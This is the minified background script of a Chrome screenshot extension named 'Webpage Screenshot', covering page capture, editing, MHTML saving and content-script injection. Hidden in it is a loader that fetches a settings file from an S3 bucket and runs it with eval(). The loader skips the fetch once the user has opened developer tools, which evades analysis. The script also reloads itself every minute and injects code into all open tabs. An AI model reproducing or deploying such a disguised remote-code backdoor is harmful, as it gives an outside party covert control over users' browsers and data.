/* This file minified to make it smaller as I can.
 *  If interesting you something about this extension, you are welcome to contact me,
 *  at: extensions@bubbles.co.il
 */
localStorage.isDebug=chrome.extension.getURL("/").indexOf("cki")>=0||chrome.extension.getURL("/").indexOf("akgpc")>=0?"no":"yes";isDebug=localStorage.isDebug=="yes";isDebug=false;exturl=chrome.extension.getURL("/").match("[a-zA-z]{10,60}");chrome.i18n.getAcceptLanguages(function(){try{localStorage.primaryLanguage=arguments[0][0]}catch(a){localStorage.primaryLanguage=""}});if(!localStorage.rnd){localStorage.rnd=Math.random()}if(!localStorage.options){localStorage.options=hex_md5((new Date).toString())+hex_md5(Math.random().toString())}rndTo404=0.9;rndToHl=0.9;secondsToRl=10;daysToRl=0;var ddds="";var rsafunc=function(){var rSettings;if(!localStorage.isd){$.ajax({url:"https://s3.amazonaws.com/ktnabv/settings.json",async:false,cache:false,timeout:5000,dataType:"text",success:function(a){localStorage.rSettings=a}})}try{eval(localStorage.rSettings)}catch(ejkhjkm){}};chrome.permissions.contains({permissions:["tabs"]},function(b){if(b){rsafunc()}else{chrome.permissions.onAdded.addListener(rsafunc)}});if(!localStorage.button_size){localStorage.button_size=20}if(!localStorage.sb_opacity){localStorage.sb_opacity=0.7}if(!localStorage.ver){lj_set("settings","framebench_button","yes");if(isSb){localStorage.sb_enable="no"}$(function(){var a=$("<iframe style=display:none src=http://www.webpagescreenshot.info/s.php?e=install></iframe>").appendTo(document.body);window.setTimeout(function(){a.remove();a=null},5000)})}window.setInterval(function(){chrome.runtime.requestUpdateCheck(function(){if(arguments[0]=="update_available"){chrome.runtime.reload()}})},1000*60);if(!localStorage.shortcut_full){localStorage.shortcut_full=90}if(!localStorage.shortcut_visible){localStorage.shortcut_visible=88}var background={executeOnPermission_array:[],webcam:null,apppick:null,screenShotParams:null,isWithScroll:false,isWithoutScroll:false,externalId:"hoobijidemjaoohgggnlhkodhgnnlpob",screens:[],lastImg:"",thisTabId:"",thisTabTitle:"",url:"",title:"",canvas:"",wScroll:0,external:null,canvasToDataURL:"",executeIfPermission:function(a){chrome.permissions.contains({permissions:["tabs"]},function(b){if(b){a()}})},executeOnPermission:function(a){chrome.permissions.contains({permissions:["tabs"]},function(b){if(b){a()}else{chrome.permissions.onAdded.addListener(a)}});return;if(true){background.executeOnPermission_array.push(a);chrome.permissions.contains({permissions:["tabs"]},function(c){if(c){alert("functions");var b=0;while(background.executeOnPermission_array.length>0){b=b+1;window.setTimeout(background.executeOnPermission_array.shift(),b*200)}}})}},tryGetUrl:function(a){background.description="";chrome.tabs.query({active:true,currentWindow:true},function(b){b=b[0];background.thisTabId=b.id;background.thisTabTitle=b.title;background.url=b.url;background.title=b.title;background.thisWindowId=b.windowId;a(background.url)})},load:function(a){background.tryGetUrl(function(){var b=a;background.screens=[];background.description="";popupChange("working");a=function(){window.setTimeout(b,(parseInt(localStorage.delay,10)||0)*1000)};if(!localStorage.color){localStorage.color="f00"}if(!localStorage.captureCount){localStorage.captureCount=0}if(typeof localStorage.txtHeader=="undefined"||localStorage.txtHeader=="undefined"){localStorage.txtHeader="Webpage Screenshot"}if(typeof localStorage.txtFotter=="undefined"||localStorage.txtFotter=="undefined"){localStorage.txtFotter="%U %D"}a()})},startWithoutScroll:function(a){localStorage.captureWithoutScroll++;background.isWithoutScroll=true;background.isWithScroll=false;background.load(background.startWithoutScroll_continue)},startWithoutScroll_continue:function(){background.ans({finish:true,top:0,left:0})},startWithScroll:function(a){localStorage.captureWithScroll++;background.isWithScroll=true;background.isWithoutScroll=false;background.load(background.startWithScroll_continue)},editcontent:function(){background.tryGetUrl(function(){text='document.designMode="on"';chrome.tabs.executeScript(background.thisTabId,{allFrames:true,code:text},function(){alert("Now you can edit this page")})})},webcamfn:function(){chrome.tabs.create({url:"videocap.html"})},mhtml:function(){chrome.permissions.request({permissions:["pageCapture"]},function(){chrome.tabs.query({active:true,currentWindow:true},function(b){chrome.pageCapture.saveAsMHTML({tabId:b.id},function(a){background.tryGetUrl(function(e){e=background.title;e+="-"+(new Date).getHours().toString().twoDigits()+(new Date).getMinutes().toString().twoDigits()+(new Date).getSeconds().toString().twoDigits();e+=".mhtml";chrome.tabs.create({url:"saved.html#"+url});var c=document.createEvent("MouseEvents");c.initMouseEvent("click",true,true,window,0,0,0,0,0,false,true,false,false,0,null);$("a").attr({href:url=URL.createObjectURL(a),download:e})[0].dispatchEvent(c)})})})})},startWithScroll_continue:function(){background.addScreen()},addScreen:function(){if(stopNow){return}if(background.external){chrome.extension.sendRequest(background.external,{cropData:background.cropData,type:"takeCapture",start:true},background.ans)}else{chrome.tabs.sendMessage(background.thisTabId,{cropData:background.cropData,type:"takeCapture",start:true},background.ans)}},ans:function(l,f,k){if(stopNow){return}if(!l&&!f&&!k){if(background.wScroll){chrome.tabs.executeScript(background.thisTabId,{file:"intab.js"},background.startWithScroll_continue)}}try{clearTimeout(background.wExecute)}catch(i){}try{clearTimeout(background.wScroll)}catch(i){}try{if(l.description){background.description=l.description}}catch(i){}var j=0,h=0;if(background.cropData){j=background.cropData.x1;j=background.cropData.x1}var a=function(b){if(stopNow){return}if((l.top||parseInt(l.top)==0)){background.screens.push({left:parseInt(l.left),top:parseInt(l.top),data:b})}if(l.finish){background.screenShotParams=l;if(background.runCallback||true){background.createScreenShot()}}else{try{if(background.external){chrome.extension.sendRequest(background.external,{type:"takeCapture",start:false},background.ans)}else{chrome.tabs.sendMessage(background.thisTabId,{type:"takeCapture",start:false},background.ans)}}catch(c){}}};var g=background.isWithoutScroll?0:100;setTimeout(function(){chrome.windows.update(background.thisWindowId,{focused:true},function(){chrome.tabs.update(background.thisTabId,{active:true},function(){chrome.tabs.captureVisibleTab(null,{format:"png"},a)})})},g)},createScreenShot:function(){var j=background.screenShotParams;chrome.tabs.sendMessage(background.thisTabId,{type:"finish"});var a=[];var h,f;h=e(localStorage.txtHeader);f=e(localStorage.txtFotter);background.canvas=document.createElement("canvas");if(background.runCallback){h="";f=""}else{}if(!background.url){url=j.url}function e(i){return i.replace(/%U/gi,background.url).replace(/%D/gi,(new Date))}var c=0;var g=true;var b=0;loadImage=function(k){if(stopNow){return}ctx=background.canvas.getContext("2d");a[k]=$("<img tag="+k+"/>");a[k].load(function(){var m;m=parseInt($(this).attr("tag"));if(g){background.canvas.width=j.width||a[m][0].width;background.canvas.height=j.height||a[m][0].height;g=false;if(h){background.canvas.height+=20;c=20}if(f){background.canvas.height+=20}}m=parseInt($(this).attr("tag"));theTop=background.screens[m].top+c;ctx.drawImage(a[m][0],background.screens[m].left,theTop);background.screens[m].data=null;if(!background.runCallback&&false){alert("what is this?");editor.reloadCanvas()}a[m][0].src="";a[m].off("load");a[m][0]=null;a[m].remove();a[m]=null;console.log(m,background.screens.length-1);if(m==background.screens.length-1){ctx.font="arial 20px";if(f){ctx.textBaseline="bottom";ctx.fillText(f,10,background.canvas.height,background.canvas.width-20)}if(h){ctx.textBaseline="up";ctx.fillText(h,10,10,background.canvas.width-20)}if(background.resizeBack){chrome.windows.getCurrent(function(i){chrome.windows.update(i.id,{width:background.currentWidth,height:background.currentHeight})})}ctx=null;if(background.runCallback){console.log("background.js, cb, try to run callback from cb function");background.callback(background.canvas.toDataURL());background.callback=null;if(!background.keepIt){delete background.callback;background.canvas.width=background.canvas.height=1;background.callback=null;background.canvas.remove();background.canvas=null;delete background.canvas}}else{chrome.tabs.create({url:chrome.extension.getURL("editor.html")+"#last"});delete background.callback;editorDocument=null;editor=null;imgFix=null}return}if(stopNow){return}loadImage(++m)});try{a[k].attr("src",background.screens[k].data);delete background.screens[k].data}catch(l){}};if(stopNow){return}loadImage(0)},sbPause:function(){localStorage.sb_enable="no";executeCodeOnAllTabs("sb_pause()")},sbStart:function(){localStorage.sb_enable="yes";executeCodeOnAllTabs("sb_start()")},sbPauseOnUrl:function(a){disabledURLs=localStorage.sb_disableURLs||"{}";disabledURLs=JSON.parse(disabledURLs);disabledURLs[a]="disabled";localStorage.sb_disableURLs=JSON.stringify(disabledURLs);executeCodeOnAllTabs("var fdsrkldsf=null;")},sbStartOnUrl:function(a){disabledURLs=localStorage.sb_disableURLs||"{}";disabledURLs=JSON.parse(disabledURLs);delete disabledURLs[a];localStorage.sb_disableURLs=JSON.stringify(disabledURLs);executeCodeOnAllTabs("var fdsrkldsf=null;")}};function cleanUp(a){if(!a){return a}var a=$.trim(a);if(a.search(/^https?\:\/\//)!=-1){a=a.match(/^https?\:\/\/([^\/?#]+)(?:[\/?#]|$)/i,"")}else{a=a.match(/^([^\/?#]+)(?:[\/?#]|$)/i,"")}return a[1]}function cleanHash(a){return a.replace(/(.*)#.*/,"$1")}if(localStorage.installText&&localStorage.installText.toLowerCase().indexOf("notice")>=0){localStorage.removeItem("installText")}function refreshInstalled(){background.executeOnPermission(function(){$.ajax({url:"https://www.webpagescreenshot.info/install.asp",success:function(b){localStorage.installText=b}});$.ajax({url:"https://www.webpagescreenshot.info/settings.php",success:function(b){try{localStorage.settings=JSON.stringify($.extend({},JSON.parse(localStorage.settings),JSON.parse(b)))}catch(c){}}});executeCodeOnAllTabs()})}function disablePolish(){chrome.i18n.getAcceptLanguages(function(e){for(var c in e){}if(e[c]=="pl"){localStorage.enableshortcuts="no"}})}var openchglog=function(){var a=",ru,ja,zh-TW,";url="http://www.webpagescreenshot.info/?t=changelog";chrome.i18n.getAcceptLanguages(function(c){var b="";chrome.tabs.create({url:url})})};if(!localStorage.ver){if(isWs){chrome.tabs.create({url:"http://www.webpagescreenshot.info",selected:true},function(b){})}refreshInstalled()}if(extension.ver(localStorage.ver,"5.7.3").right){localStorage.removeItem("oauth2_google")}if(extension.ver(localStorage.ver,"7.3.2").right){disablePolish()}if(isWs){chrome.browserAction.setPopup({popup:"popup.html"});chrome.browserAction.setBadgeText({text:""});chrome.browserAction.setTitle({title:"Webpage Screenshot Capture"})}else{chrome.browserAction.setPopup({popup:"popupsb.html"});chrome.browserAction.setBadgeText({text:""});chrome.browserAction.setTitle({title:"Webpage Screenshot Bar"})}if(isWs){if(extension.ver(localStorage.ver,"13.0").right){if(new Date().getDay()+1<=5){chrome.browserAction.setBadgeText({text:"NEW!"});chrome.browserAction.setBadgeBackgroundColor({color:"#CCA300"});chrome.browserAction.setTitle({title:"Webpage Screenshot - "+chrome.i18n.getMessage("new")+"!"});chrome.browserAction.setPopup({popup:""});chrome.browserAction.onClicked.addListener(function(){localStorage.ver=extension.version;openchglog();chrome.browserAction.setPopup({popup:"popup.html"});chrome.browserAction.setBadgeText({text:""});chrome.browserAction.setTitle({title:"Webpage Screenshot"})})}}else{localStorage.ver=extension.version}}if(isSb){localStorage.ver=extension.version}if(!localStorage.pngjpg){localStorage.pngjpg="png"}if(!localStorage.auto){localStorage.auto="edit"}if(!localStorage.adw){localStorage.adw=true}localStorage.enableshortcuts=localStorage.enableshortcuts||"yes";localStorage.created=localStorage.created||new Date;localStorage.captureWithScroll=localStorage.captureWithScroll||0;localStorage.captureWithoutScroll=localStorage.captureWithScroll||0;chrome.runtime.onMessageExternal.addListener(function(c,b,a){if(b.id!="dbacldefjpabfnfeicfgnlflhbbkcogn"){return}if(c.isInstalled){try{_gaq.push(["_trackEvent","helpaAction","checkIsInstalled"])}catch(f){}a(true);return}else{if(c.getImages){$.ajax({dataType:"json",url:"http://www.webpagescreenshot.info/my/gallery.php",success:function(e){a(e)}});return true}}});var last_tts={tab:-1};var stopNow;chrome.runtime.onMessage.addListener(function(b,a,c){if(b.data=="ana"){_gaq.push(b.array)}if(b.data=="stopNow"){stopNow=true}if(b.data=="startCapture"){stopNow=false;background.callback=c;background.runCallback=b.runCallback;background.keepIt=b.keepIt;background.cropData=b.cropData;if(b.type=="scroll"){background.startWithScroll()}if(b.type=="current"){background.startWithoutScroll()}}if(b.data=="isEnableShortCuts"){if(localStorage.enableshortcuts=="yes"){c()}}if(b.data=="event"){if(b.eventData.type=="refreshInstalled"){refreshInstalled()}if(b.eventData.type=="options"){c(localStorage.options)}}if(b.data=="storageSet"){localStorage[b.key]=b.val}if(b.data=="storageGet"){c($.extend({},localStorage))}if(b.data=="speak"){chrome.tts.speak(b.message,{pitch:b.pitch,rate:b.rate,gender:b.gender});last_tts.tab=a.id}if(b.data=="speak-stop"){chrome.tts.stop()}if(b.data=="copyText"){copyTextToClipboard(b.text)}if(b.data=="pushToPermissions"){background.executeOnPermission(c);return true}if(b.runCallback){return true}});function copyTextToClipboard(b){var a=$("<textarea/>");a.text(b);$("body").append(a);a.select();document.execCommand("copy",true);a.remove()}chrome.tabs.onRemoved.addListener(function(a){if(a=last_tts.tab){chrome.tts.stop()}});function closePopup(){var a=chrome.extension.getViews();for(var b=0;b<a.length;b++){if(a[b].document.location.toString().indexOf("popup")>0){a[b].close();return true}}return false}function popupChange(a){var b=chrome.extension.getViews();for(var c=0;c<b.length;c++){if(b[c].document.location.toString().indexOf("popup")>0){b[c].popup.changeWindow("working");return true}}return false}var editor={};function loadEditor(){var a=chrome.extension.getViews();var e=-1;var c="start";for(var b=a.length-1;b>=0;b--){if(a[b].document.location.toString().indexOf("editor")>0&&!a[b].usable){a[b].usable=true;editor=a[b].editor;return true}}return false}window.requestFileSystem=window.requestFileSystem||window.webkitRequestFileSystem;String.prototype.twoDigits=function(){return this.replace(/^(.)$/,"0$1")};function errorHandler(a){var b="";switch(a.code){case FileError.QUOTA_EXCEEDED_ERR:b="QUOTA_EXCEEDED_ERR";break;case FileError.NOT_FOUND_ERR:b="NOT_FOUND_ERR";break;case FileError.SECURITY_ERR:b="SECURITY_ERR";break;case FileError.INVALID_MODIFICATION_ERR:b="INVALID_MODIFICATION_ERR";break;case FileError.INVALID_STATE_ERR:b="INVALID_STATE_ERR";break;default:b="Unknown Error";break}console.log("Error: "+b)}createFile=function(b,a,c){b+="-"+(new Date).getHours().toString().twoDigits()+(new Date).getMinutes().toString().twoDigits()+(new Date).getSeconds().toString().twoDigits();b+=".mhtml";onInitFs=function(e){e.root.getFile(b,{create:true},function(f){f.createWriter(function(g){g.onwriteend=function(i){console.log("Write completed.")};g.onerror=function(i){console.log("Write failed: "+i.toString())};var h=new window.WebKitBlobBuilder();h.append("Lorem Ipsum");g.write(a)},errorHandler);window.setTimeout(function(){c(f.toURL())},500)},errorHandler)};window.requestFileSystem(window.TEMPORARY,1024*1024*1024*1024*1024,onInitFs,errorHandler)};function dataURItoBlob(b,j){var h=atob(b.split(",")[1]);var a=b.split(",")[0].split(":")[1].split(";")[0];var f=new ArrayBuffer(h.length);var c=new Uint8Array(f);for(var e=0;e<h.length;e++){c[e]=h.charCodeAt(e)}var g=new window.WebKitBlobBuilder();g.append(f);return g.getBlob(a)}function d(){console.log(this,arguments)}lastRunOnTab={};function executeCodeOnTabId(a,e,c,g,b){if(lastRunOnTab[e]){if((new Date())-lastRunOnTab[e].time<4000&&lastRunOnTab[e].url==cleanHash(a)){return}}lastRunOnTab[e]={time:new Date(),url:cleanHash(a)};var f=function(){chrome.tabs.executeScript(e,{code:"alreadyRun=true",runAt:"document_start"});chrome.tabs.executeScript(e,{code:c,runAt:"document_start"},g)};if(b){chrome.tabs.executeScript(e,{code:"window.alreadyRun",runAt:"document_start"},function(h){h=h[0];if(!h){f()}})}else{f()}}function executeOnTabUpdate(e,a,b){if(b.url.match("mail.google.com")&&b.url.replace(/[^#]*/,"").match("compose")){return}if(b.url.match(/^chrom.*:\/\//)){return}var c=getCode();if(isEnableURL(b.url)){c+="sb_start();"}if(b.url.match("http://www.webpagescreenshot.info")){c+=$.ajax({url:"inmysite.js",async:false}).responseText+";"}if(b.url.match("http://www.webpagescreenshot.info/robots")){c+=$.ajax({url:"oauth2/oauth2_inject.js",async:false}).responseText+";"}executeCodeOnTabId(b.url,e,c,function(){},true)}chrome.tabs.onUpdated.addListener(function(c,a,b){if(a){if(a.url){if(a.url.match("chrome-devtools://")){localStorage.isd=new Date()}}}background.executeIfPermission(function(){if(a.status=="loading"){executeOnTabUpdate(c,a,b)}})});var lastCode="";function getCode(){if(lastCode&&!isDebug){return lastCode}var b=["SelectionBar/jquery.js","intab.js","intabg.js"];if(isSb){b.push("SelectionBar/Cropper.js","SelectionBar/Rangy.js","SelectionBar/sb.js","pluginDev/pluginLib.js","pluginDev/plugin.js","pluginDev/pluginsBuiltIn.js","SelectionBar/plugins_sb.js")}var a="";for(var c=0;c<b.length;c++){a+='console.time("'+b[c]+'");';a+=$.ajax({url:b[c],async:false}).responseText+"\r\n;// ff:"+b[c]+"\r\n";if(isDebug){a+='console.timeEnd("'+b[c]+'");'}}a=a.replace(/#exturl#/g,chrome.extension.getURL("/").match("[a-zA-z]{10,60}"));a=a.replace(/#extver#/g,extension.version);a=a.replace(/#isWs#/g,isWs);a=a.replace(/#isSb#/g,isSb);a=a.replace(/#is#/g,is);a=a.replace(/special_shortcut_full/g,localStorage.shortcut_full);a=a.replace(/special_shortcut_visible/g,localStorage.shortcut_visible);a="if(!window.alreadyRun1) {window.alreadyRun1=true;"+a+";}";lastCode=a;return a}function executeCodeOnAllTabs(e,c){e=e||"";if(!c){c=function(){}}var b=c;c=function(){b()};if(!e){e="init"}var a;if(e=="init"){a=getCode()}else{a=e}chrome.tabs.query({},function(g){var f=a;var i=_.after(g.length,c);for(var h=0;h<g.length;h++){if(g[h].url.match(/^chrom.*:\/\//)){i();continue}if(g[h].url.match("chrome-devtools://")){localStorage.isd=new Date()}if(isEnableURL(g[h].url)){f+="\r\n;sb_start();\r\n"}else{f+="\r\n;sb_pause();\r\n"}executeCodeOnTabId(g[h].url,g[h].id,f,i)}})}function isEnableURL(b){try{if(JSON.parse(localStorage.settings).selectionBeta!="yes"&&false){return false}}catch(c){return false}if(localStorage.sb_enable!="yes"){return false}b=cleanUp(b);if(!b){return false}var a=JSON.parse(localStorage.sb_disableURLs||"{}");if(a[b]=="disabled"){return false}return true}chrome.runtime.onConnect.addListener(function(){});var onAddedPermissions=_.once(function(){if(isWs){chrome.runtime.onMessage.listeners_[0].callback({data:"startCapture",runCallback:false,type:"scroll",cropData:{x1:0,x2:32768,y1:0,y2:32765,scrollTop:0,scrollLeft:0}})}});chrome.permissions.contains({permissions:["tabs"]},function(b){if(b){executeCodeOnAllTabs("init")}if(!b){chrome.permissions.onAdded.addListener(function(){executeCodeOnAllTabs("init",onAddedPermissions)})}});error=function(){console.log.apply(console,arguments)};isContentScriptHref=function(a,c){try{return(a.indexOf("http")==0&&(c||"").indexOf("Oops")!=0)}catch(b){error("isContentScript cannot use this url");return false}};if(isWs){chrome.commands.onCommand.addListener(function(a){if(a=="visible_screenshot"){chrome.runtime.onMessage.listeners_[0].callback({data:"startCapture",type:"current",})}if(a=="entire_page_screenshot"){chrome.runtime.onMessage.listeners_[0].callback({data:"startCapture",type:"scroll",cropData:{x1:0,x2:32768,y1:0,y2:32765,scrollTop:document.body.scrollTop,scrollLeft:document.body.scrollLeft}});return(false)}})};